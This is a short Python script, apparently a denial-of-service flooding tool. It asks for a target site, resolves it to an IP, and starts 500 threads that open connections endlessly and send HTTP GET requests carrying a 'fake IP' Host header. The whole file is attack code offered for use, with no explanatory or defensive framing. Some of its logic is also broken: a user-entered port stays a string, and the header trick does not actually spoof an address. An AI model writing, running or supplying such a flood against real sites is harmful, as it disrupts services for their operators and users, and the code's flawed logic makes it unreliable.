import socket
import threading
import time

def target(url):
    ip = socket.gethostbyname(url) 
    return ip
url = input("Enter site name without http:// or https://  example : target.com : ")
target = target(url)
print (f"Site Name is   {url}:::IP Address is    {target}")
fake_ip = input("Enter a fake ip or just click enter button for default :") or ('182.21.20.32')
print(f"Fake IP Is {fake_ip}")
port = input("Enter port or just click enter for default : ")or  80
print(f"Port number is {port}")

time.sleep(1)
       
attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        print(attack_num)
        
        s.close()


for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()